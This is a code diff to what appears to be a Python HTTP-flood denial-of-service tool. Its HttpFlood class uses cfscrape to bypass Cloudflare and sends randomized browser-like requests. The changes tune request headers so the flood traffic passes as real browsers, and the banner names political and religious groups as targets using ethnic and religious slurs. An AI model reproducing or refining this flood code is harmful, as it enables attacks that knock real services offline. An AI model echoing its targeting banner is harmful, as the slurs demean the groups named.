@@ -169,6 +169,12 @@ class BlackLists:
 
     ]
 
+    UNITED_NATIONS = [
+    ]
+
+
+
+
 class Counter:
     def __init__(self, value=0):
         self._value = RawValue('i', value)
@@ -1081,10 +1087,10 @@ class HttpFlood(Thread):
         "Cache-Control" : "max-age=0",
         "Upgrade-Insecure-Requests" : "1",
         "User-Agent" : randchoice(self._useragents),
-        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
+        "Accept" : "text/css,*/*;q=0.1,text/html,application/xhtml+xml,application/xml;q=0.9,image/svg+xml,image/png,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
         "Accept-Encoding" : "gzip, deflate",
         "Accept-Language" : "vi,en;q=0.9,en-US;q=0.8",
-        "Sec-Fetch-Site": "same-origin\r\n"}
+        "Sec-Fetch-Site": "same-origin"}
 
         s = None
         with suppress(Exception), cfscrape.create_scraper() as s:
@@ -1116,10 +1122,10 @@ class HttpFlood(Thread):
         "Cache-Control" : "max-age=0",
         "Upgrade-Insecure-Requests" : "1",
         "User-Agent" : randchoice(self._useragents),
-        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n",
+        "Accept" : "text/css,*/*;q=0.1,text/html,application/xhtml+xml,application/xml;q=0.9,image/svg+xml,image/png,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
         "Accept-Encoding" : "gzip, deflate",
         "Accept-Language" : "vi,en;q=0.9,en-US;q=0.8",
-        "Sec-Fetch-Site": "same-origin\r\n"}
+        "Sec-Fetch-Site": "same-origin"}
 
         with suppress(Exception), cfscrape.create_scraper() as s:
             try:
@@ -1219,7 +1225,7 @@ class HttpFlood(Thread):
         req =  "GET / HTTP/1.1\r\nHost: " + str(self._host) + "\r\n"
         req += "Cache-Control: no-cache\r\n"
         req += "User-Agent: " + randchoice(self._useragents) + "\r\n"
-        req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/svg+xml,image/png,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
+        req += "Accept: text/css,*/*;q=0.1,text/html,application/xhtml+xml,application/xml;q=0.9,image/svg+xml,image/png,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
         req += "Sec-Fetch-Site: same-origin\r\n"
         req += "Sec-GPC: 1\r\n"
         req += "Sec-Fetch-Mode: navigate\r\n"
@@ -1325,8 +1331,8 @@ class HttpFlood(Thread):
         "Cache-Control" : "max-age=0",
         "Upgrade-Insecure-Requests" : "1",
         "User-Agent" : randchoice(self._useragents),
-        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
-        "Accept-Encoding" : "gzip, deflate",
+        "Accept" : "text/css,*/*;q=0.1,text/html,application/xhtml+xml,application/xml;q=0.9,image/svg+xml,image/png,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
+        "Accept-Encoding" : "gzip, compress, br, deflate",
         "Accept-Language" : "vi,en;q=0.9,en-US;q=0.8"}
 
         # Attacking
@@ -1937,12 +1943,13 @@ if __name__ == '__main__':
         with suppress(IndexError):
 
             print("This tool is against the tankie, ultranationalist, religious right and militarist")
-            print("Only for kacap, tankie, FUNDIE, papist, fundie, kach, hindutva, homophobia, junta and their allies")
+            print("Only for kacap, tankie, raghead, papist, fundie, kach, hindutva, homophobia, junta and their allies")
             print("Do not attack Fatah, PKK, National Unity Government and other resistance group")
             print("This tool is against the oppression, the harmful propaganda and the cyber attack")
             print("Do not abuse this program, this is the final method")
-            print("if you just oppose the policy of the goverment, please use OSINT tools.")
+            print("if you just accuse the corruptiopn of the goverment, please use OSINT tools.")
             print("For example maigret, emploLeaks and so on")
+            print("if you live in the democratic state, do not use this tool. you have an inviolence method")
 
             one = argv[1].upper()
 
